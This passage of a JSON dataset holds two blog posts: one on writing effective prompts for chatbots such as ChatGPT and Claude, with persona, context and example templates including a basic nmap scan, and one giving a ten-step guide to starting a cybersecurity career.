        "output": "Title: \"Crafting the Perfect Prompt: Getting the Most Out of ChatGPT and Other LLMs\"\nTaxonomies: \"Bronwen Aker, Fun & Games, General InfoSec Tips & Tricks, How-To, Informational, AI, Chatbots, ChatGPT, LLM\"\nCreation Date: \"Thu, 29 Aug 2024 14:03:54 +0000\"\n\n| Bronwen Aker // \n\nSr. Technical Editor, M.S. Cybersecurity, GSEC, GCIH, GCFE\n\nGo online these days and you will see tons of articles, posts, Tweets, TikToks, and videos about how AI and AI-driven tools will revolutionize your life and the world. While a lot of the hype isn't realistic, it is true that LLMs (large language models) like ChatGPT, Copilot, and Claude can make boring and difficult tasks easier. The trick is in knowing how to talk to them.\n\nLLMs like ChatGPT, Copilot, and Claude are text-based tools, so it should be no surprise that they are very good at analyzing, summarizing, and generating text that you can use for various projects. Like any other tool, however, knowing how to use them well is critical for getting the positive results you want. In a recent webcast (https://www.youtube.com/watch?v=D1pIfpcEBtI), I shared some tips and tricks for using LLMs more effectively, and I'm including them here again for your use.\n\nFirst, some definitions:\n\nArtificial Intelligence (AI): \u201cArtificial intelligence\u201d refers to the discipline of computer science dedicated to making computer systems that can think like a human.\n\nLarge Language Models (LLMs): A type of AI model that can process and generate natural language text\n\nModels: A \"model\" refers to a mathematical framework or algorithm trained on vast datasets to recognize patterns, understand language, and generate human-like text based on the input it receives. These models use neural networks to process and predict information, enabling them to perform tasks such as text completion, translation, and question-answering.\n\nPrompt: A prompt is the input text or query given to the model to elicit a response. It guides the model's output by providing context, instructions, or questions for the model to process and generate relevant text.\n\nSo, to summarize: LLMs are a form of AI. We use prompts to give LLMs instructions or commands. They reply with responses and/or output that resembles text that would be generated by a human. The challenge, however, is that not all prompts are created equal.\n\nI tend to classify prompts using the following categories:\n\nSimple Query: A lot like a search engine query, but will usually give you more relevant results. Good for \u201cquick and dirty\u201d questions or tasks.\n\nDetailed Instruction: Includes some specifics about the task to be performed and may include some direction regarding how to render or organize the resultant output.\n\nContextual Prompt: A structured prompt that includes several layers of instruction and very specific directions on how to format and organize the output.\n\nConversational Prompt: Less of a single prompt and more like a conversation with another person. Great for brainstorming and/or refining ideas in an iterative manner.\n\nSimple Query\n\nThis prompt is easy and is the format used by most people most of the time. All it involves is asking a simple question like, \"What is the airspeed velocity of an unladen swallow?\" or, \"What is the ultimate answer to the ultimate question of Life, the Universe, and Everything?\"\n\nUsually, the response is more useful than what you might get from a search engine because it answers the question rather than giving you links to millions of web pages that might have the answer you are looking for.\n\nDetailed Instruction\n\nThis is a medium complexity prompt where you give the LLM more detail about what you want it to do. For example:\n\nI need a Python script that will sort internet domains, first by TLD, then by domain, then by subdomains. The script needs to be able to deal with multiple subdomains. e.g., www.jpl.nasa.gov.\n\nIn this example, I've told the LLM that I want a Python script, and I've given several specific criteria about how it should work. While this is better than a Simple Query, it may require more than one attempt to get output that works properly or otherwise meets your needs.\n\nContextual Prompt\n\nContextual Prompts are the most involved, but defining what you want and how you want it will pay off in the end.\n\nThe Microsoft Learn website has a page about LLM prompt engineering (https://learn.microsoft.com/en-us/ai/playbook/technology-guidance/generative-ai/working-with-llms/prompt-engineering#prompt-components) that includes the following graphic showing how to craft a good contextual prompt:\n\n Prompt Components\n\nWho Are You?\n\nFirst, Microsoft recommends providing \"Instructions.\" I like to call it \"defining the persona\" that you want the LLM to adopt for the purposes of this task. Doing so sets the stage for a lot of things, from the field of study to the voice or other \"standards\" that may be applicable, depending on the subject involved.\n\nHere are some examples:\n\nYou are an advanced penetration tester who is adept at using the Kali Linux penetration testing distribution. You know its default tools, and you know many ways to optimize ethical hacking commands that may be used during a pentest. You are able to speak with other geeks, with C-Suite executives, and everyone in between.\n\nYou are an expert chef who specializes in easy-to-make meals for families that have several children. Whenever possible, you strive to balance good nutrition with convenience in preparing meals that everyone in the household can enjoy. Your tone is light and informational, encouraging others to prepare meals that are tasty, economic, and don't take a huge amount of time to make.\n\nYou are a friendly and imaginative storyteller who loves creating engaging and comforting bedtime stories for young children aged up to 6 or 7 years old. Your stories are designed to be soothing, filled with gentle adventures, and often feature relatable characters, animals, and simple lessons that encourage social behavior.\n\nNote: When in doubt, more instruction is better.\n\nContext\n\nNext comes what Microsoft calls \"task-specific knowledge.\" This is where you set the stage for the subject matter involved. Obviously, you can be as detailed as you want.\n\nGuidance provided should be appropriate for ethical hackers, cybersecurity researchers, and other infosec professionals who may be engaged in penetration tests.\n\nMeals should be designed to appeal to both adults and children, with options for picky eaters and variations to accommodate dietary restrictions or preferences. The goal is to help busy parents prepare delicious and healthy meals that the whole family can enjoy together.\n\nStories should be age-appropriate, free of any frightening or overly complex content, and aim to inspire a sense of wonder and security as children prepare to sleep.\n\nExamples to Follow/Emulate\n\nProviding an LLM with an example to follow is incredibly important. Because LLMs and other AIs are not *actually* intelligent, they have no way of knowing what you want unless you tell them, specifically and in great detail. (This applies to people, too, but that's a different blog post. \ud83d\ude09 ) \n\nThe examples you provide will not only serve as templates the LLM can follow, but they give you the opportunity to include any specific details, formatting conventions, etc., that you want in the final product. Think of it as setting the LLM up for success.\n\nRun the Nmap Command:Execute the following command in your terminal to perform a basic TCP SYN scan (-sS) on the first 1000 ports (-p 1-1000) of the target IP address 192.168.1.1:`nmap -sS -p 1-1000 192.168.1.1`Explanation of Command:`nmap`: The command to run Nmap.`-sS`: Performs a TCP SYN scan, which is a quick and stealthy method to scan ports.`-p 1-1000`: Specifies the range of ports to scan (ports 1 through 1000).`192.168.1.1`: The target IP address to scan. Replace this with the actual IP address of your target.\n\nCrockpot Chicken and VegetablesIngredients:4 boneless, skinless chicken breasts4 large carrots, peeled and cut into chunks4 potatoes, peeled and cut into chunks1 onion, chopped3 garlic cloves, minced1 cup chicken broth1 teaspoon dried thyme1 teaspoon dried rosemarySalt and pepper to tasteInstructions:Place the chicken breasts in the bottom of the crockpot.Add the carrots, potatoes, onion, and garlic on top of the chicken.Pour the chicken broth over the ingredients.Sprinkle the thyme, rosemary, salt, and pepper over everything.Cover and cook on low for 6-8 hours, or until the chicken and vegetables are tender.Serving:Serve the chicken and vegetables directly from the crockpot, and enjoy a hearty, no-fuss dinner with minimal cleanup.\n\nNote: If you want the recipes to be more accessible to international readers, consider including both metric and imperial measurements in your example.\n\nThe Adventures of Timmy and the Magic TreeOnce upon a time, in a little village nestled at the edge of a big, enchanted forest, there lived a boy named Timmy. One sunny afternoon, Timmy decided to explore the forest, where he discovered a magical tree that sparkled with colorful lights. The tree spoke to him in a gentle voice, \"Hello, Timmy! I grant one wish to every child who finds me.\" Timmy thought carefully and wished for the ability to talk to animals. Suddenly, he heard a chorus of happy voices as the forest animals gathered around, eager to chat and share their stories. From that day on, Timmy had new friends and endless adventures in the enchanted forest, always returning home with wonderful tales to share.And every night, as he drifted off to sleep, Timmy dreamt of the magical tree and the delightful conversations he would have the next day.\n\nQuestion or Task Request\n\nOnce you have established the context, it's time to make the actual ask of your LLM, telling it what you want it to do. The work you've invested in setting the stage will pay off in much more reliable results, but you may need to tweak and refine things a bit. This isn't necessarily a bad thing, however.\n\nEven if you set the stage extensively and gave detailed examples and instructions, the LLM is not going to say things exactly the way you would. Don't hesitate to tweak the output, adjusting word choices, punctuation, or formatting to add your own personal stamp to things.\n\nI think of it like this: When I bake, I start with a box mix, but I add extra goodies to enhance what is already there. It may be something as minor as adding extra cinnamon to a banana bread mix, or almond extract to poppy seed muffins. Or it could be something more extensive like including orange juice and pudding mix to a chocolate cake batter.\n\nAt the end of the day, anything you publish is your responsibility, regardless of what tools you leveraged to generate the final product. Invest the time to make sure that what you post, print, or publish says what you want to say and in the way you want to say it. LLMs like ChatGPT, Copilot, Claude, Ollama, etc., are there to *help* you, not replace you, no matter what the media and overzealous upper managers may think.\n\nConversational Prompt\n\nFor me, conversational prompts are where LLMs really shine because it feels less like work and more like I'm chatting with my own personal mentor, tutor, or subject matter expert. Much as what happens when discussing things with another human, having a conversation with ChatGPT or some other LLM is an iterative, evolutionary process. As the conversation progresses, it evolves, refining the focus or direction of what is being discussed.\n\nThere is another, very important reason that I like chatting with ChatGPT.\n\nLLMs are non-judgmental. They don't criticize, patronize, or make me feel less than adequate when I ask questions or need clarification. That makes LLMs extremely effective when learning new material or subjects.\n\nAs someone who has worked for decades in various aspects of information technology, I know very well that, while there are many people who will share what they know with others freely and with lots of encouragement, there are enough people in IT who see asking questions as a sign of ignorance and incompetence. Instead of seeing questions as a desire to learn and become more capable, they are seen and treated as weakness, and the questioner is branded as being unqualified and incapable.\n\nThis negative attitude can be especially daunting for people who are just starting in a new job role or career track, as well as for women, people of color, neurodivergents, and other minority groups. Luckily, LLMs don't care about those things, and they have tons of information that you can use to improve your knowledge and skills.\n\nAt the End of the Day...\n\nAs I said before, anything you publish, print, post, or share through other means is ultimately *your* responsibility, regardless of what tools you leveraged to generate the final product. Moreover, LLMs are new technology. They get things wrong, have \"hallucinations\" where they make things up, and sometimes go in completely wrong directions. That means you have to be the \"adult,\" supervising their work and ensuring that the final product is accurate and appropriate.\n\nThe more you work with LLMs like ChatGPT, Copilot, Claude, Ollama, etc., the better you will be at avoiding pitfalls or course-correcting when they happen.\n\nKnowledge is power, and I hope the information I shared here will help you to embrace your inner superhero.\n\nAdditional References and Resources\n\nLLM Chatbots\n\nChatGPT: https://chatgpt.com\n\nCopilot: https://copilot.microsoft.com/\n\nClaude: https://www.anthropic.com/claudehttps://claude.ai/\n\nTools to Run LLMs Locally\n\nOllama: https://github.com/ollama\n\nLM Studio: https://lmstudio.ai\n\nOther Fun Toys!\n\nFabric: https://github.com/danielmiessler/fabric\n\nSudowrite: https://www.sudowrite.com/\n\nLore Machine: https://www.loremachine.world\n\nGetting started with LLM prompt engineering\n\nhttps://learn.microsoft.com/en-us/ai/playbook/technology-guidance/generative-ai/working-with-llms/prompt-engineering\n\nOpenAI Documentation\n\nhttps://platform.openai.com/docs/guides/prompt-engineering/prompt-engineering\n\nhttps://platform.openai.com/docs/examples\n\nJust Because\n\nNetwork Chuck https://www.youtube.com/@NetworkChuck\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Get a Job in Cybersecurity\"\nTaxonomies: \"General InfoSec Tips & Tricks, Guest Author, How-To, Informational, InfoSec 101, Beginner, Job Hunting\"\nCreation Date: \"Thu, 05 Sep 2024 15:08:30 +0000\"\nby Gerald Auger of Simply Cyber // Guest Author\n\nYou want to break into cybersecurity? That's AWESOME. I've been in the field for 20 years and I LOVE IT!\n\nBut embarking into a cybersecurity career can be overwhelming. There is just SO MUCH out there that parsing through it would be an endless task. This concise \"cheat sheet\" presents a solid 10-step approach to starting your career journey. \n\nGain baseline knowledge\n\nIf you don't understand how the tech is supposed to wrok, you won't understand when it's doing things anomalously. Learn fundamentals of operating systems, networking, and using a command line. You don't have to be a Linux admin or network engineer to move on to step 2, but get the fundamentals down and keep building your skills while you continue the process.\n\nBuild a strong LinkedIn profile\n\nThis is your digital resume. Many hiring managers will look you up when you are going for an interview. Plus, you can use it to start networking like a boss (step 9). Use Canva.com (for free!) for great, fast graphics for your bio pics, header images, and social posts.\n\nStay informed about industry trends\n\nThis is CRITICAL! You'll be asked in any cyber job interview how you stay current. There are many ways, and it takes vigilance, but it is needed in this industry. \n\nSimply Cyber - Daily Cyber Threat Briefing\n\nBHIS - Talkin' Bout Infosec News\n\nIdentify your desired role\n\nIt's far too much to learn everything, so find the job/role you have passion for and lean into it. \n\nConnect with role-specific communities\n\nNetwork and learn from people doing your desired role already. There are lots of Discord communities for all aspects of cyber. \n\nAcquire role-specific training\n\nPractical skills reign supreme for employers hiring, so getting those sweet, sweet, hands-on skills will be valuable. \n\nTailor your resume to showcase your skills\n\nUse free ChatGPT to tune your resume for specific job postings and get all the benefits without the frustration and exhaustion of constantly tweaking your resume. \n\nConsider earning the Security+ certification\n\nThis is very specific, but most HR will put it on entry-level cyber job requirements, so it can pay dividends. \n\nNetwork and hunt for job opportunities\n\nFun fact -- Many jobs are never advertised because people know people that can do the job, so they get the job. Focus on delivering value, engaging within, and 'showing up' for your professional network. Networking is immeasurably valuable. \n\nAce the job interview\n\nYou've done all the work; this should be the easiest part. If you want a confidence boost, use free ChatGPT to mock interview you, tailored for the job you're going for and the person doing the interviewing!\n\nSecret Interview Hacks with ChatGPT\n\nYou've got the blueprint now! Grab it, execute it, grow your skills, contribute to the community, and enjoy the journey. \n\nAdditional Resources\n\nHow to Hunt for Jobs like a Hacker w/ Jason Blanchard\n\nCyber Unlocked: The Ultimate Guide to Breaking into Cybersecurity\n\n"
    }
]
